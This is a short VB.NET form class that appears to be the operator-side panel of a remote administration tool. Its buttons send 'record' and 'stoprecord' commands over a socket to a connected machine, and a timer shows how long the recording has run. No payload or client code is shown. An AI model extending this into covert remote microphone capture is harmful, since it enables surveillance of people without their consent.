Public Class mic
    Public sock As Integer
    Public recording As Boolean
    Private stopwatch As New Stopwatch
    Private Sub SkyDarkButton1_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton1.Click
        Main.S.Send(sock, "record")
        Timer1.Start()
        Me.stopwatch.Start()

    End Sub

    Private Sub SkyDarkButton2_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton2.Click
        Main.S.Send(sock, "stoprecord")
        Me.stopwatch.Stop()
        Me.stopwatch.Reset()
        Label1.Text = "00:00:00:00"

    End Sub

    Dim i = 0
    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick

        Dim elapsed As TimeSpan = Me.stopwatch.Elapsed
        Label1.Text = String.Format("{0:00}:{1:00}:{2:00}:{3:00}", _
        Math.Floor(elapsed.TotalHours), _
        elapsed.Minutes, elapsed.Seconds, _
        elapsed.Milliseconds)





    End Sub
End Class